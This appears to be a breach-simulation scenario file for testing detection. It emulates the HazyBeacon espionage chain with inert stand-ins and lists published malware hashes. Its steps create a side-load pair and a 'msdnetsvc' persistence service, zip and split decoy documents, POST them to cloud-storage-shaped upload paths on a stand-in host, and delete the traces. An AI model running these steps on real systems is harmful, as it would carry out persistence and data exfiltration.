@@ -1,0 +1,586 @@
+# CL-STA-1020 (Unit 42, 2025-07-14): HazyBeacon is mscorsvc.dll side-loaded by mscorsvw.exe from C:\Windows\assembly\,
+# kept alive by service msdnetsvc, beaconing to an AWS Lambda function URL; it pulls igfx.exe (collector), 7z.exe and
+# Google Drive / Dropbox uploaders into C:\ProgramData\, zips tariff-themed documents per host, splits them, tries to
+# upload, then deletes the archives and payloads. ENDPOINT (EDR, Windows primary, linux variants): inert DLL stand-in
+# beside a copied signed mscorsvw.exe, a demand-start msdnetsvc service, the beacon / upload HTTP shapes against
+# ${STAGE_HOST:-127.0.0.1}, a real per-host zip + split of lab decoys and the real deletion. NETWORK (NDR): a WildFire
+# threat log per downloaded tool carrying the report sha256 (enrichable) plus an EAL recurring-comms beacon on the preset
+# destination: the report redacts the Lambda URL, so that record is UN-ENRICHABLE and stitches on src_host only.
+# EAL legs run from a Linux jumpbox: set TARGET_IP / TARGET_USER and TARGET_HOST = the endpoint's exact agent_hostname
+# (case included) so the src_host join holds (defaults read the run host). No cloud leg: the Lambda URL and Drive/Dropbox
+# accounts are actor-side, outside the victim's cloud audit. DC points at: side-load/msdnetsvc BIOCs + beacon ABIOC on the
+# endpoint, WildFire hash hits in panw_ngfw_threat_raw, CR-MP-0026 joining both on src_host. No adversary host contacted.
+scenario_id: SIM-MP-026
+name: "CL-STA-1020 HazyBeacon — mscorsvw.exe DLL Side-Load, AWS Lambda-URL C2 and Tariff-Document Cloud-Storage Exfil"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - ABIOC
+  - IOC
+  - XQL
+  - Correlation
+
+uc_ref: UCS-IR-02
+tc_ref: TC-IR-05
+tc_refs:
+  - TC-IR-05
+  - TC-NDR-01
+  - TC-EDR-03
+pov_scenario_id: POV-SC-001
+uc_name: "Incident Response"
+tc_name: "Demonstrate correlation-based detections across endpoint + network + identity telemetry"
+
+mitre_tactic: "TA0005"
+mitre_tactic_name: "Defense Evasion"
+mitre_technique: "T1574.002"
+mitre_technique_name: "Hijack Execution Flow: DLL Side-Loading"
+additional_techniques:
+  - technique: "T1543.003"
+    name: "Create or Modify System Process: Windows Service"
+  - technique: "T1102"
+    name: "Web Service"
+  - technique: "T1071.001"
+    name: "Application Layer Protocol: Web Protocols"
+  - technique: "T1105"
+    name: "Ingress Tool Transfer"
+  - technique: "T1119"
+    name: "Automated Collection"
+  - technique: "T1560.001"
+    name: "Archive Collected Data: Archive via Utility"
+  - technique: "T1567.002"
+    name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  - technique: "T1070.004"
+    name: "Indicator Removal: File Deletion"
+
+threat_report: "Unit 42 — Behind the Clouds: Attackers Targeting Governments in Southeast Asia Implement Novel Covert C2 Communication (CL-STA-1020, HazyBeacon)"
+threat_report_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+
+execution_identity:
+  default: root
+  options:
+    - root
+    - svc-backup
+
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Multi-Plane Correlation & Behavioral Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 900
+  unit: "seconds"
+success_criteria: |
+  The endpoint leg raises the side-load staging and msdnetsvc service BIOCs, the
+  Lambda-URL-shaped beacon ABIOC, the tool-drop and split-archive BIOCs, the
+  cloud-storage-upload ABIOC and the archive/payload-deletion BIOC on one host. The
+  network leg lands six WildFire threat records in panw_ngfw_threat_raw whose
+  filedigest is a published HazyBeacon-toolkit sha256 (the IOC rule fires on the
+  igfx.exe collector hash) and a recurring-comms beacon record, all carrying the
+  endpoint's src_host. CR-MP-0026 joins endpoint and network signal on src_host into
+  ONE incident inside correlation_window_seconds. Mean time from the first staging
+  step to the stitched incident is within the MTTD budget.
+moat_tier: "LEAD"
+
+correlation_window_seconds: 3600
+required_planes_in_incident:
+  - EDR
+  - NDR
+stitching_key: src_host
+
+indicators:
+  - id: ind-01
+    type: sha256
+    value: "4931df8650521cfd686782919bda0f376475f9fc5f1fee9d7cf3a4e0d9c73e30"
+    source_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+    safe_form: hash_only
+    surfaces_in: [step-01]
+    description: "HazyBeacon Lambda-URL backdoor, C:\\Windows\\assembly\\mscorsvc.dll (report IOC list). Printed for the DC to search; the on-disk stand-in is inert and hashes differently."
+  - id: ind-02
+    type: sha256
+    value: "279e60e77207444c7ec7421e811048267971b0db42f4b4d3e975c7d0af7f511e"
+    source_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+    safe_form: log_field
+    surfaces_in: [step-05]
+    description: "igfx.exe file collector, C:\\ProgramData\\igfx.exe (report IOC list) — WildFire threat-log filedigest."
+  - id: ind-03
+    type: sha256
+    value: "d961aca6c2899cc1495c0e64a29b85aa226f40cf9d42dadc291c4f601d6e27c3"
+    source_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+    safe_form: log_field
+    surfaces_in: [step-05]
+    description: "GoogleGet.exe Google Drive connect tool, C:\\ProgramData\\GoogleGet.exe (report IOC list) — WildFire threat-log filedigest."
+  - id: ind-04
+    type: sha256
+    value: "d20b536c88ecd326f79d7a9180f41a2e47a40fcf2cc6a2b02d68a081c89eaeaa"
+    source_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+    safe_form: log_field
+    surfaces_in: [step-05]
+    description: "google.exe Google Drive uploader, C:\\ProgramData\\google.exe (report IOC list) — WildFire threat-log filedigest."
+  - id: ind-05
+    type: sha256
+    value: "304c615f4a8c2c2b36478b693db767d41be998032252c8159cc22c18a65ab498"
+    source_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+    safe_form: log_field
+    surfaces_in: [step-05]
+    description: "GoogleDrive.exe Google Drive uploader, C:\\ProgramData\\GoogleDrive.exe (report IOC list) — WildFire threat-log filedigest."
+  - id: ind-06
+    type: sha256
+    value: "f0c9481513156b0cdd216d6dfb53772839438a2215d9c5b895445f418b64b886"
+    source_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+    safe_form: log_field
+    surfaces_in: [step-05]
+    description: "GoogleDriveUpload.exe Google Drive uploader, C:\\ProgramData\\GoogleDriveUpload.exe (report IOC list) — WildFire threat-log filedigest."
+  - id: ind-07
+    type: sha256
+    value: "3255798db8936b5b3ae9fed6292413ce20da48131b27394c844ecec186a1e92f"
+    source_url: "https://unit42.paloaltonetworks.com/windows-backdoor-for-novel-c2-communication/"
+    safe_form: log_field
+    surfaces_in: [step-05]
+    description: "Dropbox.exe Dropbox uploader, C:\\ProgramData\\Dropbox.exe (report IOC list) — WildFire threat-log filedigest."
+
+# The ngfw_eal_emitter / ngfw_threat_emitter analytics log-streamers POST shape-true
+# panw_ngfw_traffic_raw / panw_ngfw_threat_raw records to the operator collector.
+external_tools:
+  - name: cortexsim-eal-cli
+    source: "https://github.com/hankthebldr/cortex-pov-engine"
+    type: script
+    install_inline: false
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The report's loader is mscorsvw.exe started by its registered service, so it is the
+# CGO. step-01 (side-load staging) is the root; the service (step-02) and the beacon
+# (step-03) descend from it by process_lineage; the NGFW beacon record (step-04) and
+# the WildFire tool-delivery records (step-05) are the network sessions of that beacon;
+# the tool drop (step-06), collection (step-07), upload (step-08) and deletion (step-09)
+# continue the same process chain. src_host is the shared entity every leg carries.
+cgo_anchor:
+  image_name: "mscorsvw.exe"
+  primary_username: "nt authority\\system"
+
+steps:
+  - id: step-01
+    name: "Stage the side-load pair — copied signed mscorsvw.exe beside an inert mscorsvc.dll"
+    command: |
+      $asm = 'C:\ProgramData\cortexsim-mp026\assembly'
+      New-Item -ItemType Directory -Force -Path $asm | Out-Null
+      $ngen = Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe'
+      Copy-Item -Path $ngen -Destination (Join-Path $asm 'mscorsvw.exe') -Force
+      Set-Content -Path (Join-Path $asm 'mscorsvc.dll') -Value 'cortexsim-mp026 inert side-load stand-in, not a PE' -Encoding ASCII
+      Get-FileHash -Algorithm SHA256 -Path (Join-Path $asm 'mscorsvc.dll'), (Join-Path $asm 'mscorsvw.exe') | Format-Table -AutoSize
+      Write-Output 'report sha256 of HazyBeacon mscorsvc.dll: 4931df8650521cfd686782919bda0f376475f9fc5f1fee9d7cf3a4e0d9c73e30'
+    identity: root
+    mitre_technique: "T1574.002"
+    platforms: ["windows", "linux"]
+    platform_variants:
+      linux: |
+        ASM=/var/tmp/.cortexsim-mp026/assembly
+        mkdir -p "$ASM"
+        cp /bin/true "$ASM/mscorsvw"
+        printf 'cortexsim-mp026 inert side-load stand-in, not an ELF\n' > "$ASM/libmscorsvc.so"
+        LD_PRELOAD="$ASM/libmscorsvc.so" "$ASM/mscorsvw" 2>"$ASM/preload.err" || true
+        sha256sum "$ASM/mscorsvw" "$ASM/libmscorsvc.so"
+        echo 'report sha256 of HazyBeacon mscorsvc.dll: 4931df8650521cfd686782919bda0f376475f9fc5f1fee9d7cf3a4e0d9c73e30'
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A signed Microsoft binary (mscorsvw.exe) is copied out of the .NET Framework directory and an unsigned DLL named for its import (mscorsvc.dll) is written beside it — the HazyBeacon side-load staging pair, keyed on the file-write pair outside the framework path."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "bioc-mp-026-mscorsvc-dll-written-beside-a-relocated-mscorsvw-exe"
+
+  - id: step-02
+    name: "Persist as service msdnetsvc pointing at the relocated mscorsvw.exe (demand start)"
+    command: |
+      $bin = 'C:\ProgramData\cortexsim-mp026\assembly\mscorsvw.exe'
+      if (-not (Get-Service -Name msdnetsvc -ErrorAction SilentlyContinue)) { sc.exe create msdnetsvc binPath= "$bin" start= demand DisplayName= msdnetsvc }
+      sc.exe qc msdnetsvc
+    identity: root
+    mitre_technique: "T1543.003"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["windows", "linux"]
+    platform_variants:
+      linux: |
+        U=/etc/systemd/system/msdnetsvc.service
+        if [ -e "$U" ]; then
+          echo "msdnetsvc.service pre-exists; left untouched"
+        else
+        cat > "$U" <<'UNIT'
+        # cortexsim-mp026
+        [Unit]
+        Description=msdnetsvc (cortexsim-mp026 lab persistence, never enabled)
+        [Service]
+        Type=oneshot
+        ExecStart=/var/tmp/.cortexsim-mp026/assembly/mscorsvw
+        UNIT
+        fi
+        if command -v systemctl >/dev/null 2>&1; then systemctl daemon-reload || true; fi
+        cat /etc/systemd/system/msdnetsvc.service
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "sc.exe creates service msdnetsvc whose binPath is an mscorsvw.exe outside %WINDIR%\\Microsoft.NET — the report's persistence for the side-loaded HazyBeacon DLL. On the linux variant the same BIOC fires on the write of /etc/systemd/system/msdnetsvc.service by the side-load causality."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "bioc-mp-026-service-msdnetsvc-created-for-a-relocated-mscorsvw-exe"
+
+  - id: step-03
+    name: "Lambda-URL-shaped C2 polling from the side-load chain to the lab stand-in"
+    command: |
+      $stage = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
+      $log = 'C:\ProgramData\cortexsim-mp026\beacon.log'
+      foreach ($i in 1..4) {
+        try { $code = (Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Uri "http://${stage}:8080/" -Method Get).StatusCode } catch { $code = 'no-listener' }
+        Add-Content -Path $log -Value "$(Get-Date -Format o) poll $i host=$env:COMPUTERNAME status=$code"
+        Start-Sleep -Seconds 3
+      }
+      Get-Content -Path $log
+    identity: root
+    mitre_technique: "T1102"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["windows", "linux"]
+    platform_variants:
+      linux: |
+        LOG=/var/tmp/.cortexsim-mp026/beacon.log
+        for i in 1 2 3 4; do
+          code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://${STAGE_HOST:-127.0.0.1}:8080/" || echo no-listener)
+          printf '%s poll %s host=%s status=%s\n' "$(date -u +%FT%TZ)" "$i" "$(hostname -s)" "$code" >> "$LOG"
+          sleep 3
+        done
+        cat "$LOG"
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "A process in the mscorsvw.exe service causality chain — which never talks HTTP in its learned baseline — opens a tight recurring series of outbound web sessions to a single destination. Behavioural ABIOC on recurring egress from the side-load causality, anchored on causality_actor_process_instance_id; it does not depend on the Lambda URL, which the report redacts."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "abioc-mp-026-recurring-web-egress-from-the-mscorsvw-exe-side-load-causality"
+
+  - id: step-04
+    name: "NGFW leg — recurring-comms beacon record for the run host (preset destination, un-enrichable)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=${TARGET_IP:-$(hostname -I | awk '{print $1}')}
+      SRC_HOST=${TARGET_HOST:-$(hostname -s)}
+      SRC_USER=${TARGET_USER:-$(id -un)}
+      cat > /tmp/mp-026-beacon.yml <<YML
+      campaign_id: CMP-MP-BEACON-026
+      name: "CL-STA-1020 HazyBeacon — recurring Lambda-URL-shaped beacon (NGFW EAL)"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [mp-026, unit42, hazybeacon, ngfw-eal]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-026-beacon.yml --live
+    identity: root
+    mitre_technique: "T1071.001"
+    causality:
+      parent_step: step-03
+      pivot: endpoint_network_stitch
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "NGFW EAL behavioural alert — the endpoint (src = the run host) makes a tight recurring burst of small HTTPS sessions to one fleet-rare destination. Preset destination: the report redacts the actor's Lambda function URL, so this record is enrichable by src_host only, never by a report indicator."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "abioc-mp-026-ngfw-recurring-https-beacon-from-the-side-load-host"
+
+  - id: step-05
+    name: "NGFW leg — WildFire threat logs for the six tools pulled over the C2 (report sha256s)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/threat/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=${TARGET_IP:-$(hostname -I | awk '{print $1}')}
+      SRC_HOST=${TARGET_HOST:-$(hostname -s)}
+      SRC_USER=${TARGET_USER:-$(id -un)}
+      cat > /tmp/mp-026-threat.yml <<YML
+      campaign_id: CMP-MP-THREAT-026
+      name: "CL-STA-1020 HazyBeacon — WildFire verdicts on the C2-delivered toolkit"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [mp-026, unit42, hazybeacon, wildfire]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "279e60e77207444c7ec7421e811048267971b0db42f4b4d3e975c7d0af7f511e"
+            file_name: "igfx.exe"
+            file_type: "PE"
+            verdict: malicious
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-02
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "d961aca6c2899cc1495c0e64a29b85aa226f40cf9d42dadc291c4f601d6e27c3"
+            file_name: "GoogleGet.exe"
+            file_type: "PE"
+            verdict: malicious
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-03
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "d20b536c88ecd326f79d7a9180f41a2e47a40fcf2cc6a2b02d68a081c89eaeaa"
+            file_name: "google.exe"
+            file_type: "PE"
+            verdict: malicious
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-04
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "304c615f4a8c2c2b36478b693db767d41be998032252c8159cc22c18a65ab498"
+            file_name: "GoogleDrive.exe"
+            file_type: "PE"
+            verdict: malicious
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-05
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "f0c9481513156b0cdd216d6dfb53772839438a2215d9c5b895445f418b64b886"
+            file_name: "GoogleDriveUpload.exe"
+            file_type: "PE"
+            verdict: malicious
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-06
+          plugin: ngfw_threat_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            file_sha256: "3255798db8936b5b3ae9fed6292413ce20da48131b27394c844ecec186a1e92f"
+            file_name: "Dropbox.exe"
+            file_type: "PE"
+            verdict: malicious
+            action: alert
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-026-threat.yml --live
+    identity: root
+    mitre_technique: "T1105"
+    causality:
+      parent_step: step-03
+      pivot: network_session
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: IOC
+        description: "IOC rule — a panw_ngfw_threat_raw record for the run host whose filedigest is the published sha256 of the HazyBeacon igfx.exe file collector (Unit 42 IOC list); Unit 42 enrichment attributes the case to CL-STA-1020."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "ioc-file-sha256-279e60e77207444c7ec7421e811048267971b0db42f4b4d3e975c7d0af7f511e"
+      - plane: NDR
+        type: XQL
+        description: "Validation query: all six HazyBeacon-toolkit sha256s landed in panw_ngfw_threat_raw for one src_host inside the run window, with action alert (never a block)."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "xql-mp-026-hazybeacon-toolkit-sha256s-landed-in-panw-ngfw-threat-raw"
+
+  - id: step-06
+    name: "Tool drop — collector and cloud-storage uploader stand-ins written under ProgramData"
+    command: |
+      $drop = 'C:\ProgramData\cortexsim-mp026\tools'
+      New-Item -ItemType Directory -Force -Path $drop | Out-Null
+      foreach ($n in 'igfx.exe','GoogleGet.exe','google.exe','GoogleDrive.exe','GoogleDriveUpload.exe','Dropbox.exe') {
+        Set-Content -Path (Join-Path $drop $n) -Value "cortexsim-mp026 inert stand-in for $n, not a PE" -Encoding ASCII
+      }
+      Get-ChildItem -Path $drop | Select-Object Name, Length, LastWriteTime | Format-Table -AutoSize
+    identity: root
+    mitre_technique: "T1105"
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    platforms: ["windows", "linux"]
+    platform_variants:
+      linux: |
+        DROP=/var/tmp/.cortexsim-mp026/tools
+        mkdir -p "$DROP"
+        for n in igfx GoogleGet google GoogleDrive GoogleDriveUpload Dropbox; do
+          printf 'cortexsim-mp026 inert stand-in for %s, not an ELF\n' "$n" > "$DROP/$n"
+          chmod 0755 "$DROP/$n"
+        done
+        ls -l "$DROP"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "The side-load causality writes executables named igfx.exe, GoogleGet.exe, google.exe, GoogleDrive.exe, GoogleDriveUpload.exe and Dropbox.exe under C:\\ProgramData — the report's collector and cloud-storage uploader set, keyed on the file-name set written by one causality."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "bioc-mp-026-hazybeacon-collector-and-uploader-set-written-under-programdata"
+
+  - id: step-07
+    name: "Collection — find tariff-themed lab decoys, zip them per host, split into volumes"
+    command: |
+      $lab = 'C:\ProgramData\cortexsim-mp026'
+      $docs = Join-Path $lab 'docs'
+      $stg = Join-Path $lab 'stage'
+      New-Item -ItemType Directory -Force -Path $docs, $stg | Out-Null
+      foreach ($d in @{ 'draft-letter-on-tariff-measures.txt' = 'CORTEXSIM DECOY draft letter on tariff measures'; 'trade-dispute-briefing.txt' = 'CORTEXSIM DECOY trade dispute tariff briefing' }.GetEnumerator()) {
+        Set-Content -Path (Join-Path $docs $d.Key) -Value ($d.Value + ' ' + (-join ((1..6000) | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })))
+      }
+      Set-Content -Path (Join-Path $docs 'canteen-menu.txt') -Value 'CORTEXSIM DECOY unrelated document'
+      $since = (Get-Date).AddDays(-30)
+      $hits = Get-ChildItem -Path $docs -Recurse -File -Include *.txt, *.docx, *.pdf | Where-Object { $_.LastWriteTime -ge $since } | Select-String -Pattern 'tariff' -List
+      $zip = Join-Path $stg "$env:COMPUTERNAME.zip"
+      Compress-Archive -Path $hits.Path -DestinationPath $zip -Force
+      $sevenZip = Get-Command 7z.exe -ErrorAction SilentlyContinue
+      if ($sevenZip) { & $sevenZip.Source a -v1k "$zip.7z" $zip | Out-Null } else {
+        $bytes = [IO.File]::ReadAllBytes($zip); $n = 1
+        for ($o = 0; $o -lt $bytes.Length; $o += 1024) { $len = [Math]::Min(1024, $bytes.Length - $o); [IO.File]::WriteAllBytes(('{0}.{1:D3}' -f $zip, $n), $bytes[$o..($o + $len - 1)]); $n++ }
+      }
+      Get-ChildItem -Path $stg | Select-Object Name, Length | Format-Table -AutoSize
+    identity: root
+    mitre_technique: "T1560.001"
+    causality:
+      parent_step: step-06
+      pivot: process_lineage
+    platforms: ["windows", "linux"]
+    platform_variants:
+      linux: |
+        LAB=/var/tmp/.cortexsim-mp026; DOCS=$LAB/docs; STG=$LAB/stage
+        mkdir -p "$DOCS" "$STG"
+        printf 'CORTEXSIM DECOY draft letter on tariff measures\n' > "$DOCS/draft-letter-on-tariff-measures.txt"
+        head -c 4096 /dev/urandom | base64 >> "$DOCS/draft-letter-on-tariff-measures.txt"
+        printf 'CORTEXSIM DECOY trade dispute tariff briefing\n' > "$DOCS/trade-dispute-briefing.txt"
+        head -c 4096 /dev/urandom | base64 >> "$DOCS/trade-dispute-briefing.txt"
+        printf 'CORTEXSIM DECOY unrelated document\n' > "$DOCS/canteen-menu.txt"
+        find "$DOCS" -type f \( -name '*.txt' -o -name '*.docx' -o -name '*.pdf' \) -mtime -30 -exec grep -l tariff {} + > "$STG/hits.lst"
+        tar -czf "$STG/$(hostname -s).tgz" -T "$STG/hits.lst"
+        split -b 1k -d -a 3 "$STG/$(hostname -s).tgz" "$STG/$(hostname -s).tgz."
+        ls -l "$STG"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "The same causality builds an archive named after the host from keyword-matched documents and splits it into numbered volumes (7z -v or .001/.002 chunk writes) in a staging directory — the report's igfx.exe + 7z.exe collection pattern."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "bioc-mp-026-host-named-archive-of-keyword-matched-documents-split-into-volumes"
+
+  - id: step-08
+    name: "Exfil attempt — upload the archive volumes to cloud-storage API paths on the lab stand-in"
+    command: |
+      $stage = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
+      $stg = 'C:\ProgramData\cortexsim-mp026\stage'
+      $log = 'C:\ProgramData\cortexsim-mp026\exfil.log'
+      foreach ($part in Get-ChildItem -Path $stg -File | Where-Object { $_.Name -match '\.(\d{3}|7z\.\d{3})$' }) {
+        foreach ($path in '/upload/drive/v3/files?uploadType=media', '/2/files/upload') {
+          try { $code = (Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Method Post -Uri "http://${stage}:8080$path" -InFile $part.FullName -ContentType 'application/octet-stream').StatusCode } catch { $code = 'no-listener' }
+          Add-Content -Path $log -Value "$(Get-Date -Format o) $($part.Name) -> $path status=$code"
+        }
+      }
+      Get-Content -Path $log
+    identity: root
+    mitre_technique: "T1567.002"
+    causality:
+      parent_step: step-07
+      pivot: process_lineage
+    platforms: ["windows", "linux"]
+    platform_variants:
+      linux: |
+        STG=/var/tmp/.cortexsim-mp026/stage; LOG=/var/tmp/.cortexsim-mp026/exfil.log
+        for part in "$STG"/*.tgz.[0-9][0-9][0-9]; do
+          for path in '/upload/drive/v3/files?uploadType=media' '/2/files/upload'; do
+            code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 -X POST -H 'Content-Type: application/octet-stream' --data-binary "@$part" "http://${STAGE_HOST:-127.0.0.1}:8080$path" || echo no-listener)
+            printf '%s %s -> %s status=%s\n' "$(date -u +%FT%TZ)" "$(basename "$part")" "$path" "$code" >> "$LOG"
+          done
+        done
+        cat "$LOG"
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "A process descended from the side-load causality reads split archive volumes from a staging directory and POSTs them to Google Drive / Dropbox upload API paths — behavioural cloud-storage exfil ABIOC on the read-then-upload sequence, anchored on causality_actor_process_instance_id. The lab stand-in replaces the real storage service."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "abioc-mp-026-staged-archive-volumes-uploaded-to-cloud-storage-api-paths"
+
+  - id: step-09
+    name: "Cover tracks — delete the archive volumes and the dropped payloads"
+    command: |
+      $lab = 'C:\ProgramData\cortexsim-mp026'
+      Get-ChildItem -Path (Join-Path $lab 'stage'), (Join-Path $lab 'tools') -File -ErrorAction SilentlyContinue | Remove-Item -Force
+      Get-ChildItem -Path $lab -Recurse -File | Select-Object FullName | Format-Table -AutoSize
+    identity: root
+    mitre_technique: "T1070.004"
+    causality:
+      parent_step: step-08
+      pivot: process_lineage
+    platforms: ["windows", "linux"]
+    platform_variants:
+      linux: |
+        LAB=/var/tmp/.cortexsim-mp026
+        find "$LAB/stage" "$LAB/tools" -type f -delete
+        find "$LAB" -type f
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "The same causality deletes the split archive volumes and the collector/uploader executables it wrote earlier — the report's post-exfil clean-up, keyed on deletion of files the causality itself created."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "bioc-mp-026-side-load-causality-deletes-its-own-archives-and-payloads"
+      - plane: ANALYTICS
+        type: Correlation
+        description: "CR-MP-0026 joins the endpoint side-load / service / beacon / collection / upload / deletion alerts and the NGFW WildFire toolkit-hash and recurring-beacon records on src_host inside correlation_window_seconds into ONE CL-STA-1020 incident."
+        ttp_ref: "TTP-2026-0185"
+        detection_id: "CR-MP-0026"
+
+cleanup:
+  commands:
+    - "command -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command 'if (sc.exe qc msdnetsvc 2>$null | Select-String -Quiet -SimpleMatch cortexsim-mp026) { sc.exe delete msdnetsvc }; Remove-Item -Recurse -Force -Path '\\''C:\\ProgramData\\cortexsim-mp026'\\'' -ErrorAction SilentlyContinue' || true"
+    - "if grep -qs cortexsim-mp026 /etc/systemd/system/msdnetsvc.service; then rm -f /etc/systemd/system/msdnetsvc.service; command -v systemctl >/dev/null 2>&1 && systemctl daemon-reload; fi; true"
+    - "rm -f /tmp/mp-026-beacon.yml /tmp/mp-026-threat.yml && rm -rf /var/tmp/.cortexsim-mp026"
+
+author: "Henry Reed"
+created: "2026-10-27"
+last_updated: "2026-10-27"
+tags:
+  - unit42
+  - stitched-chain
+  - actor:cl-sta-1020
+  - hazybeacon
+  - dll-side-loading
+  - lambda-url-c2
+  - cloud-storage-exfil
+  - ngfw-threat
+  - eal-plugin
